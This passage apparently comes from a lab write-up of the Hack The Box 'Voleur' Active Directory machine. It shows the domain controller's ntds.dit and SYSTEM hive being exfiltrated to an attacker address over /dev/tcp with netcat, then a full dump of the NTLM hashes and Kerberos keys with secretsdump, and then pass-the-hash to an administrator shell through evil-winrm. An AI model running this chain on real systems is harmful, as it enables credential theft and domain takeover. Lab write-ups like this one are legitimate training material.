ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCoXI8y9RFb+pvJGV6YAzNo9W99Hsk0fOcvrEMc/ij+GpYjOfd1nro/ZpuwyBnLZdcZ/ak7QzXdSJ2IFoXd0s0vtjVJ5L8MyKwTjXXMfHoBAx6mPQwYGL9zVR+LutUyr5fo0mdva/mkLOmjKhs41aisFcwpX0OdtC6ZbFhcpDKvq+BKst3ckFbpM1lrc9ZOHL3CtNE56B1hqoKPOTc+xxy3ro+GZA/JaR5VsgZkCoQL951843OZmMxuft24nAgvlzrwwy4KL273UwDkUCKCc22C+9hWGr+kuSFwqSHV6JHTVPJSZ4dUmEFAvBXNwc11WT4Y743OHJE6q7GFppWNw7wvcow9g1RmX9zii/zQgbTiEC8BAgbI28A+4RcacsSIpFw2D6a8jr+wshxTmhCQ8kztcWV6NIod+Alw/VbcwwMBgqmQC5lMnBI/0hJVWWPhH+V9bXy0qKJe7KA4a52bcBtjrkKU7A/6xjv6tc5MDacneoTQnyAYSJLwMXM84XzQ4us= svc_backup@DC

 ssh -i id_rsa svc_backup@voleur.htb -p 2222
```

# Secrets Dump
By enumerating the file system, I found that the C drive was mounted in /mnt
```
svc_backup@DC:~$ cd /mnt
svc_backup@DC:/mnt$ ls
c
svc_backup@DC:/mnt$ cd c
svc_backup@DC:/mnt/c$ ls -al
ls: cannot access 'DumpStack.log.tmp': Permission denied
ls: cannot access 'pagefile.sys': Permission denied
ls: PerfLogs: Permission denied
ls: 'System Volume Information': Permission denied
total 0
drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30 03:39 '$Recycle.Bin'
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jun 30 14:08 '$WinREAgent'
drwxrwxrwx 1 svc_backup svc_backup 4096 Jun 30 14:08  .
drwxr-xr-x 1 root       root       4096 Jan 30 03:46  ..
lrwxrwxrwx 1 svc_backup svc_backup   12 Jan 28 20:34 'Documents and Settings' -> /mnt/c/Users
-????????? ? ?          ?             ?            ?  DumpStack.log.tmp
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 29 01:10  Finance
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 29 01:10  HR
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 29 01:10  IT
d--x--x--x 1 svc_backup svc_backup 4096 May  8  2021  PerfLogs
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 30 06:20 'Program Files'
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 30 05:53 'Program Files (x86)'
drwxrwxrwx 1 svc_backup svc_backup 4096 Jun  4 15:34  ProgramData
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 28 20:34  Recovery
d--x--x--x 1 svc_backup svc_backup 4096 Jan 30 03:49 'System Volume Information'
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 30 03:38  Users
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jun  5 12:53  Windows
dr-xr-xr-x 1 svc_backup svc_backup 4096 May 29 15:07  inetpub
-????????? ? ?          ?             ?            ?  pagefile.sys

```

And also I found something useful
```
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ ls
ntds.dit  ntds.jfm

svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ ls
SECURITY  SYSTEM
```
Let's download them to our local machine to crack them.
```
cat ntds.dit > /dev/tcp/10.10.14.16/443

cat SYSTEM  > /dev/tcp/10.10.14.16/443

nc -lnvp 443 >ntds.dit

nc -lnvp 443 >SYSTEM
```

Then crack them
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Voleur]
└─$ impacket-secretsdump -ntds ntds.dit -system SYSTEM local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
DC$:des-cbc-md5:64e05b6d1abff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
krbtgt:des-cbc-md5:34ae31d073f86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
[*] Cleaning up... 

```

Then get the ticket and connect it
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Voleur]
└─$ impacket-getTGT voleur.htb/Administrator -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2 -dc-ip 10.10.11.76 -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Trying to connect to KDC at 10.10.11.76:88
[+] Trying to connect to KDC at 10.10.11.76:88
[*] Saving ticket in Administrator.ccache
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Voleur]
└─$ export KRB5CCNAME=Administrator.ccache 
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Voleur]
└─$ evil-winrm -i dc.voleur.htb -r voleur.htb                                                
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

`Walkup` password: `e656e07c56d831611b577b160b259ad2`
# Description

A typical Active Directory machine, with the main focus on using the Golden Ticket to collect information and synchronizing time with the DC server.